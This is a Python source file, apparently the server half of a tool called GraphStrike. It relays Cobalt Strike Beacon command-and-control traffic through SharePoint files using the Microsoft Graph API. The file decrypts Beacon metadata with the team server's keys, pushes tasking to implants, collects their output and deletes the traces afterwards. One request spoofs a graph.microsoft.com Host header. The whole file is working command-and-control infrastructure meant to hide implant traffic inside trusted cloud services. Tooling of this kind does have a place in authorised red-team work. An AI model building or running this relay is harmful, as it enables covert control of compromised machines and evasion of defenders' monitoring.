#!/usr/bin/env python3

import sys
import os

# Add folder containing required imports to path
sys.path.append(f"{os.getcwd()}/inc")

# Weird place to print a banner, but if user hasn't completed setup we still want the banner with the error message.
from banner import *
print(BANNER) 
print("GraphStrike Server\n")

# Import our GraphStrike assets
from common import *

############################# GLOBAL VARS ###################################
access_token = "" #Initialize var which will be updated with token on runtime 
masterTracker = dict()
refreshTime = 0
failedGlobal = False
TS_IP = "https://127.0.0.1/"
LISTENER_PORT = 443
CS_MESSAGE_PORT = 5000
HTTP_GET = "http-get"
HTTP_POST = "http-post"

# External cs-decrypt-metadata.py script from https://github.com/DidierStevens/DidierStevensSuite/blob/master/cs-decrypt-metadata.py
metadataScript = "inc/cs-decrypt-metadata.py"
metadataCommand = f"{metadataScript} -f {CS_DIR}.cobaltstrike.beacon_keys -t 7:Metadata,13,12 " # Leave space as we tack on metadata afterwards

@dataclass
class stateInfo():
    state: str
    signaled: bool


############################ USE SCRIPT TO GET BEACONID FROM METADATA ############################
def GetBeaconId(metadata):
    beaconId = None
    output = subprocess.getoutput(metadataCommand + metadata).split()

    for line in output:
        if "bid:" in line:
            beaconId = output[output.index(line) + 2]

    # Make sure the metadata parser actually runs
    if beaconId == None:
        p_err("Cannot parse BeaconId: are you running in a venv / have you installed all dependencies?", True)
    else:
        return beaconId

################### KILL BEACON THREAD + DELETE FILES IN SHAREPOINT #######################
def BeaconCleanup(beaconData):
    p_warn(f"Beacon {beaconData['beaconId']}: Cleaning up...")
    if beaconData['thread'].is_alive():
        beaconData['killThread'] = True
        beaconData['outputReady'].set()

        # Wait for Beacon thread to exit before proceeding
        while True:
            if not beaconData['thread'].is_alive():
                break

    # Delete TS tasking file
    p_info(f"Beacon {beaconData['beaconId']}: Deleting TS tasking file")
    DeleteFile(access_token, beaconData['id'])

    # Check to see if there is an associated beacon output file and delete that too if so
    postFile = beaconData.get('http-post', None)
    if postFile != None:
        p_info(f"Beacon {beaconData['beaconId']}: Deleting Beacon output file")
        DeleteFile(access_token, masterTracker[postFile]['id'])

    # Set state to 'dead' 
    beaconData['state'].state = 'dead'

    # Inform on completion of cleanup
    p_success(f"Beacon {beaconData['beaconId']}: Cleanup complete!")

############################ GET LIST OF CHANNELS FUNCTION ############################
def CheckBeacons():

    # Get driveItems
    driveItems = ListFiles(access_token)

    for entry in driveItems:

        partnerFile = None
        mode = None
        partnerComms = None

        if BID_DELIMITER in entry:
            mode = HTTP_POST
            partnerFile = entry.split(BID_DELIMITER)[0]
            partnerComms = masterTracker[partnerFile]
        else:
            mode = HTTP_GET

        # Fetch dictionary containing data concerning this file
        comms = masterTracker.get(entry, None)

        # If entry isn't in masterTracker
        if comms == None:

            # Add entry to masterTracker and redefine comms
            masterTracker[entry] = driveItems[entry]
            comms = masterTracker[entry]

            # Entry names WITH BID_DELIMITER are http-post files. These are named identically to their partner http-get file,
            # except the http-post file has BID_DELIMITER appended followed by the beaconId. If we find one of these, split on the BID_DELIMITER
            # delimiter and populate some extra fields in the partner http-get file.
            if mode is HTTP_POST:
                comms['busyReading'] = False
                comms['http-get'] = partnerFile
                partnerComms['http-post'] = entry

            # If the entry name does NOT contain a double dash BID_DELIMITER, this is a new TS tasking channel.
            # Start new thread to handle comms, and also add some additional members for Event handlers.
            else:
                comms['state'] = stateInfo("running", False)
                comms['beaconId'] = GetBeaconId(entry)
                comms['outputReady'] = threading.Event()
                comms['busyWriting'] = False
                comms['taskingReady'] = threading.Event()
                comms['taskingReady'].set()
                comms['killThread'] = False
                comms['sleepTime'] = int(SLEEP_TIME) / 1000

                # If a TS tasking file isn't size 0 on initial boot up, there is a task waiting for Beacon to process.
                # Clear the taskingReady event so that it blocks the BeaconComms thread until Beacon collects tasking.
                if driveItems[entry]['size'] > 0:
                    comms['taskingReady'].clear()

                # Create new BeaconComms thread for this Beacon.
                p_success(f"New Beacon found: {comms['beaconId']}")
                comms['thread'] = threading.Thread(target=BeaconComms, args=(entry,))
                comms['thread'].start()

        # For Beacon output files with a size greater than 0, indicating new output
        if mode is HTTP_POST:
            if driveItems[entry]['size'] > 0:

                # Ensure we aren't already reading this message
                if comms['busyReading'] == False:
                    
                    # Lock Beacon until we are finished doing so.
                    comms['busyReading'] = True

                    # Check to see if state is exiting + we have been signaled
                    # If it is, Beacon has processed exit command and we can delete SharePoint files
                    if partnerComms['state'].state == 'exiting' and partnerComms['state'].signaled == True:
                        BeaconCleanup(partnerComms)

                    else:
                        # Signal event handler so BeaconComms() knows to fetch the file
                        partnerComms['outputReady'].set()

                        # Ensure there is a BeaconComms thread running for this Beacon, and start one if there isn't.
                        if not partnerComms['thread'].is_alive():
                            partnerComms['killThread'] = False
                            partnerComms['thread'] = threading.Thread(target=BeaconComms, args=(partnerFile,))
                            partnerComms['thread'].start()

        # TS tasking files
        else:
            # Check to see if we are blocking in BeaconComms since we just sent tasking
            if not comms['taskingReady'].is_set():

                # Make sure that the BeaconComms thread isn't in the middle of uploading a task already
                if comms['busyWriting'] == False:

                    # If the size of the TS tasking file is 0, we signal that the TS can proceed with the next upload.
                    # Beacon will set the TS tasking file size to 0 once it has received the tasking.  
                    if driveItems[entry]['size'] == 0:

                        # If a thread is already running for this Beacon, signal BeaconComms loops to proceed with more tasking from TS
                        if comms['thread'].is_alive():

                            # Ensure that the BeaconComms thread hasn't been signaled to exit already
                            if comms['killThread'] == False:

                                # set taskingReady event handler so that BeaconComms funcs will proceed with sending the next TS task
                                comms['taskingReady'].set()

                        # Otherwise start a new thread now that the Beacon has received it's prior tasking and is ready for more
                        else:
                            comms['state'].state = "running"
                            comms['taskingReady'].set()
                            comms['killThread'] = False
                            comms['thread'] = threading.Thread(target=BeaconComms, args=(entry,))
                            comms['thread'].start()

                    # If size != 0, check the lastModified date and if it has been longer than 3x the Beacon's sleep time + 1 minute, signal thread 
                    # to exit to conserve resources. If/when Beacon retrieves the task, we will spawn a new thread to handle resumed comms.
                    else:
                        if comms['thread'].is_alive():

                            # Determine how long tasking has been sitting without Beacon reading it    
                            mt = parser.isoparse(driveItems[entry]['lastModified'])
                            ct = datetime.datetime.now(datetime.timezone.utc)
                            taskWaitingTime = (ct - mt).total_seconds()

                            if taskWaitingTime > (3 * comms['sleepTime']) + 60:
                                comms['state'].state = "timeout"
                                comms['killThread'] = True
                                comms['taskingReady'].set()
    return

############################ Beacon Thread ########################################
def BeaconComms(fileName):

    # Retrieve entry from dictionary
    comms = masterTracker[fileName]

    # Run in endless loop
    while True:

        # Block here depending on state of taskingReady event handler
        comms['taskingReady'].wait()
        
        # If killThread is true, a TS task has been queued for Beacon without it retrieving it for longer than
        # the allowed timeout and this BeaconComms channel has been signaled to exit to conserve resources.
        if comms['state'].state == 'timeout' and comms['killThread']:
            p_info(f"Beacon {comms['beaconId']}: timed out -> killing thread.")
            return

        # Send Beacon http-get to TS + return any tasking
        tasking = SendGetToTS(fileName, False)
        
        # If TS returned data, we need to upload it to the TS tasking file
        if len(tasking) > 0:
            UploadFile(fileName, tasking)

            # Clear taskingReady event handler so that we will block at the start of next loop until we see
            # that Beacon has received + cleared the TS tasking file
            comms['taskingReady'].clear()

        # Get current time before waiting for signal
        bt = datetime.datetime.now(datetime.timezone.utc)

        # Wait until we are signaled that Beacon has output, up to a max of the Beacon's sleep time
        comms['outputReady'].wait(comms['sleepTime'])

        # If the sleep ended because we were signaled, retrieve it and send to TS
        if comms['outputReady'].is_set():

            # If state is removing + killThread has been signaled, kill Beacon thread here.
            if (comms['state'].state == 'removing') and comms['killThread']:
                p_info(f"Beacon {comms['beaconId']}: removed from CS -> killing thread")
                return

            # Clear event handler so that we will block again in the future on this Beacon output file
            comms['outputReady'].clear()

            # Download the Beacon output file
            data = DownloadFile(comms['http-post'])

            # Zero out the Beacon output file to signal Beacon we have received the last
            UploadFile(comms['http-post'], str())

            # Send data to TS
            SendPostToTS(fileName, data)

            # If state is 'exiting' and killThread == True, we wait until here to kill Beacon thread so that
            # Beacon acknowledgement of exit is received + sent to TS
            if (comms['state'].state == 'exiting') and comms['killThread']:
                p_info(f"Beacon {comms['beaconId']}: exited gracefully -> killing thread")
                return

            # Get the current time after the wait has ended and calculate the difference 
            at = datetime.datetime.now(datetime.timezone.utc)
            elapsedTime = (at - bt).total_seconds()

            # Continue to sleep for the remainder of the sleep cycle
            if elapsedTime < comms['sleepTime']:
                time.sleep(comms['sleepTime'] - elapsedTime)

############################### Download File #######################################
def DownloadFile(fileName):
    fileId = masterTracker[fileName]['id']
    URL = f"{graphFileUrl}{fileId}/content" 
    headers = {
        'User-Agent':userAgent,
        'Authorization':f'Bearer {access_token}'
    }

    while(True):
        r = requests.get(url = URL, headers = headers)#, allow_redirects=True)
        #Parse output
        if "200" in str(r):
            #print(f"\nSuccessfully downloaded file: {str(len(r.content))} bytes\n")
            break
        else:
            p_warn(f"Hit except in Downloading file! Data is: {str(r.content)}")
            time.sleep(1)

    return r.content

############################### Upload File #######################################
def UploadFile(fileName, data):
    lenData = len(data)
    comms = masterTracker[fileName]
    fileId = comms['id']
    URL = f"{graphFileUrl}{fileId}/content" 
    uploadHeaders = {
        'User-Agent':userAgent,
        'Authorization':f'Bearer {access_token}',
        'Content-Length':str(lenData)
    }

    # Set busyWriting flag so we don't accidentally overwrite tasking
    comms['busyWriting'] = True

    while(True):
        r = requests.put(url = URL, headers = uploadHeaders, data = data)
        if "200" in str(r):
            #print(f"\nSuccessfully uploaded file: {str(lenData)} bytes\n")

            data = r.json()

            # If no data was sent, this upload was sent to wipe the http-post Beacon output file.
            # Comms is the http-post file in this case.
            if lenData == 0:
                # Since the request is complete and succesful, set busyReading to False so that
                # we know it is safe to read from the Beacon output file in the future
                comms['busyReading'] = False

            # If data was sent, this upload was sent to the TS tasking file with Beacon commands.
            else:
                # Now that the upload is complete, we can set busyWriting to false.
                comms['busyWriting'] = False

                # If the state is 'exiting', signal true so that we know we have uploaded the exit commmand to Beacon.
                # We will act when Beacon responds with it's exit response.
                if comms['state'].state == 'exiting':
                    comms['state'].signaled = True

            break
        elif "404" in str(r):
            # Need to shutdown BeacomComms thread here if we got a 404
            ""
        else:
            p_warn(f"Hit except in Uploading file: {str(r)} Data is: {str(r.content)}")
            time.sleep(1)

############################ Send GET to TS #######################################
def SendGetToTS(metaData, check):
    # 'check' boolean indicates we are just establishing whether we have TS connectivity or not; dont care about data
    global failedGlobal
    URL = TS_IP + HTTP_GET_PREFIX + metaData
    HEADERS = {
        'Accept':'*/*',
        'Accept-Encoding':'gzip, deflate, br',
        'Authorization':'Bearer'
    }

    while True:
        try:
            r = requests.get(url = URL, verify=False)

            # If SendGetToTS was called with check == TRUE, return here because we didn't error out connecting to TS
            if check:
                return

            # If we previously failed to connect to TS, print a nice message telling the user we have reconnected
            if failedGlobal == True:
                p_success("Reconnected to team server")
                failedGlobal = False

            # Otherwise break because we didn't error out
            break
        except requests.exceptions.ConnectionError:
            if check:
                p_err(f"Cannot connect to team server! Ensure that {TS_IP} is listening on port {LISTENER_PORT} and that no firewalls are causing issues!", True)
            else:
                # Only toggle this if we are the first thread to encounter the TS connection issue
                if failedGlobal == False:
                    failedGlobal = True
                    p_err("Lost connection to team server! Sleeping 60 second and retrying...", False)

                time.sleep(60)

    return r.content


############################ Send POST to TS #######################################
def SendPostToTS(fileName, data):
    global failedGlobal
    beaconId = masterTracker[fileName]['beaconId']
    URL = TS_IP + HTTP_POST_PREFIX + beaconId
    HEADERS = {
        'Accept':'*/*',
        'Host':'graph.microsoft.com',
        'Accept-Encoding':'gzip, deflate, br',
        'Content-Type':'application/octet-stream',
        'Authorization':'Bearer'
    }

    while True:
        try:
            r = requests.post(url = URL, data=data, verify=False)

            # If we previously failed to connect to TS, print a nice message telling the user we have reconnected
            if failedGlobal == True:
                p_success("Reconnected to team server")
                failedGlobal = False

            break
        except requests.exceptions.ConnectionError:
            # Only toggle this if we are the first thread to encounter the TS connection issue
            if failedGlobal == False:
                failedGlobal = True
                p_err("Lost connection to team server! Sleeping 60 second and retrying...", False)

            time.sleep(60)
    
    # Don't need to return data from TS because it's disposed of by Beacon normally anyways

###################### Handle Beacon Config Changes From TS ###########################
def OnClientConnection(conn):
    # receive data stream. it won't accept data packet greater than 1024 bytes
    data = conn.recv(1024).decode()

    p_warn(f"Command from CS client: {data}")

    # client will send messsage in format $beaconId:$sleepInSeconds
    args = data.split(":")
    command = args[0]
    beaconIds = args[1:]

    # Iterate over each beaconId sent by TS
    for bId in beaconIds:
        beaconData = None

        # Check each http-get file to locate the matching entry for the beaconId
        for entry in masterTracker.keys():
            if 'beaconId' in masterTracker[entry] and masterTracker[entry]['beaconId'] == bId:
                beaconData = masterTracker[entry]

        # If we find a match, take actions based on command option
        if beaconData != None:
            if command == 'sleep':
                beaconData['sleepTime'] = int(args[2])
            elif command == 'exit':
                beaconData['state'].state = "exiting"
            elif command == 'remove':
                # If state is exiting or dead, we don't need to perform any additional resource cleanup.
                if beaconData['state'].state != 'exiting' and beaconData['state'].state != 'dead':
                    beaconData['state'].state = "removing"
                    BeaconCleanup(beaconData)

    message = "DONE"
    conn.send(message.encode())
    conn.close()

################### Run Socket Server for Beacon Config Changes #######################
def SocketServer():
    server_socket = socket.socket()  # get instance
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # Try and bind port, sometimes this gets stuck if GraphStrike Server has been started/ended repeatedly
    p_task("Starting server to listen for message from team server...")
    try:
        server_socket.bind(("0.0.0.0", CS_MESSAGE_PORT))  # bind host address and port together
        p_success("SUCCESS!")
    except:
        p_err("Failed to bind server port! Is another instance of GraphStrike running?", True)

    server_socket.listen(50)    # configure how many client the server can listen simultaneously

    while True:
        conn, address = server_socket.accept()  # accept new connection
        threading.Thread(target=OnClientConnection, args=(conn,)).start()

############################ MAIN FUNCTION ############################
if __name__ == '__main__':

    # Check python3 version
    CheckVersion()

    # Test TS listener to ensure we can connect
    SendGetToTS("test", True)

    # Start socket server to listen for messages from CS client
    threading.Thread(target=SocketServer).start()

    # Sleep for 1 second to give SocketServer thread a chance to start
    time.sleep(1)

    # Retrieve access token for application
    p_task("Fetching auth token to use with SharePoint...")
    access_token, refreshTime = GetAccessToken()
    if access_token != None:
        p_success("SUCCESS!")
    else:
        p_err("Cannot fetch access token for application! Run provisioner.py delete and try creating a new app.", True)
            
    p_success("GraphStrike Server is running and checking SharePoint for Beacon traffic.\n")
    p_info("Press CTRL + C to stop Server.")

    # Call CheckBeacons continuously to service Beacon threads
    while(True):

        # Refresh access token if necessary
        currTime = time.time()
        if currTime > refreshTime:
             access_token, refreshTime = GetAccessToken()
        
        CheckBeacons()
        time.sleep(0.5)